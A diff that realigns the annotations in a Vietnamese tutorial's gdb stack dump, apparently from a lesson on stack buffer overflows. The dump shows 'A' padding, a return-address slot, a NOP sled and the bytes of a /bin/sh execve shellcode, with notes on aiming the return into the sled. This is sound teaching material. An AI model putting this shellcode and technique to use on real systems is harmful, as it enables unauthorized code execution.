@@ -73,20 +73,20 @@ Stack sẽ trông như sau khi bị ghi đè (Bố cục địa chỉ có thể 
 ```
 (gdb) x/100wx $esp
 0xbffffc10:     0xbffffc20      0xb7ec6165      0xbffffc28      0xb7eada75
-0xbffffc20:     0x41414141      0x41414141      0x41414141      0x41414141      <-- padding bắt đầu từ 0x41414141.
+0xbffffc20:     0x41414141      0x41414141      0x41414141      0x41414141     <-- padding bắt đầu từ 0x41414141.
 0xbffffc30:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffc40:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffc50:     0x41414141      0x41414141      0x41414141      0x41414141
-0xbffffc60:     0x41414141      0x41414141      0x41414141      0xxxxxxxxx       <-- Vị trí của Return address
-0xbffffc70:     0x90909090      0x90909090      0x90909090      0x90909090           Ở đây được tính toán = 0xbffffc6c + 0x50 = 0xbffffcbc để trả về vào giữa dãy NOPs.
+0xbffffc60:     0x41414141      0x41414141      0x41414141      0xxxxxxxxx     <-- Vị trí của Return address
+0xbffffc70:     0x90909090      0x90909090      0x90909090      0x90909090         Ở đây được tính toán = 0xbffffc6c + 0x50 = 0xbffffcbc để trả về vào giữa dãy NOPs.
 0xbffffc80:     0x90909090      0x90909090      0x90909090      0x90909090
-0xbffffc90:     0x90909090      0x90909090      0x90909090      0x90909090      <-- sau ret sẽ là chuỗi '\x90' vì sẽ có sự biến động khi chạy và debug, 
-0xbffffca0:     0x90909090      0x90909090      0x90909090      0x90909090          nên sẽ không thể tính chính xác vị trí của shellcode mà 
-0xbffffcb0:     0x90909090      0x90909090      0x90909090      0x90909090          phải ước lượng và trượt vào nó qua NOPs để đến shell.
+0xbffffc90:     0x90909090      0x90909090      0x90909090      0x90909090     <-- sau ret sẽ là chuỗi '\x90' vì sẽ có sự biến động khi chạy và debug, 
+0xbffffca0:     0x90909090      0x90909090      0x90909090      0x90909090         nên sẽ không thể tính chính xác vị trí của shellcode mà 
+0xbffffcb0:     0x90909090      0x90909090      0x90909090      0x90909090         phải ước lượng và trượt vào nó qua NOPs để đến shell.
 0xbffffcc0:     0x90909090      0x90909090      0x90909090      0x90909090
-0xbffffcd0:     0x90909090      0x50c031cc      0x732f2f68      0x622f6868        <-- Shellcode start: 0xbffffcd4,
-0xbffffce0:     0xe3896e69      0xc289c189      0x80cd0bb0      0xcd40c031             sau chuỗi NOPs sẽ là shellcode do hệ thống sẽ bỏ qua NOPs và tiếp tục thực thi.
-0xbffffcf0:     0x08040080      0x00000001      0xbffffd14      0x080483f0
+0xbffffcd0:     0x90909090      0x50c031cc      0x732f2f68      0x622f6868     <-- Shellcode start: 0xbffffcd4,
+0xbffffce0:     0xe3896e69      0xc289c189      0x80cd0bb0      0xcd40c031         sau chuỗi NOPs sẽ là shellcode do hệ thống
+0xbffffcf0:     0x08040080      0x00000001      0xbffffd14      0x080483f0         sẽ bỏ qua NOPs và tiếp tục thực thi.
 0xbffffd00:     0x080483e0      0xb7ff1040      0xbffffd0c      0xb7fff8f8
 0xbffffd10:     0x00000001      0xbffffe20      0x00000000      0xbffffe3a
 0xbffffd20:     0xbffffe4a      0xbffffe5e      0xbffffe80      0xbffffe93
